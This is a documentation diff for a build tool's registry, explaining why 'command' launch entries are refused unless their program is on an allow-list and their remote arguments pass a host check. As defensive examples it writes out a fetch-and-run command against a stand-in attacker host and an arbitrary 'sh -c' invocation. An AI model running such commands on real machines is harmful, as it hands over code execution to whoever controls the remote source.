@@ -646,6 +646,27 @@ tool in an already-running server with **no restart**:
   Locations `./zuke
   register` writes are local, so this is invisible to the
   ordinary setup.
+- **A `command` location is gated the same way.** Its argv is not "code already
+  on the machine" the way a local module path is: whoever wrote the entry chose
+  the program **and its arguments**, so `deno run -A https://attacker.example/x.ts`
+  is the refused remote-module case spelled as a command, and `sh -c …` is
+  arbitrary code with no fetch at all. A command location is therefore refused
+  unless its program appears in `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated,
+  since a program path may contain a space; `*` allows any). The entry must match
+  `command[0]` **exactly**, case-folded — deliberately not by basename, because
+  the descriptor chooses the program string, so admitting `/tmp/anywhere/make`
+  because an operator wrote `make` would point a trusted name at a file of the
+  writer's own. A refusal names the exact string to add. Two consequences are the
+  operator's call: a **relative** program resolves against the descriptor's own
+  working directory, which the same writer chooses, so prefer an absolute path;
+  and listing a shell or interpreter hands over anything reachable locally,
+  since `sh -c` needs no fetch at all. Listing a program does **not** license it
+  to fetch, though: every argument naming a remote specifier still has to pass
+  `ZUKE_REGISTRY_LAUNCH_HOSTS`, so `deno run -A https://…` is refused by origin
+  exactly as the module form is. The refusal is
+  a structured `launch_command_not_allowed` error, audited as `denied`, before
+  the confirmation prompt, with nothing spawned. `zuke register` writes a module
+  location, so this only bites a hand-authored or second-party entry.
 - **Parameters.** A run tool exposes the registered build's declared parameters
   as its input schema — keyed by the parameter's property name (e.g. `skipE2e`),
   with the kind, description, enum, and default from the descriptor. Supplied
